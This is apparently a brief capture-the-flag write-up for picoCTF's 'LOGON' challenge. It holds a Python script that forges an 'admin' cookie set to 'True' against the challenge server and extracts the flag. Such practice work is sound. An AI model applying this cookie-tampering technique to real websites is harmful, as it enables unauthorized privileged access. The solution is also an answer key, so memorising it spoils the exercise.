
> LOGON
> The aim is to change the value of a cookie to true to receive the flag 

> the script

```python3
#!/usr/bin/python
import requests
import re
params = {'user': 'A', 'password': 'A', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}
r = requests.get('http://2018shell1.picoctf.com:37861/flag', data=params, cookies=jar)
source = r.text
print(re.findall(r'(picoCTF\{.+\})', source)[0])
```
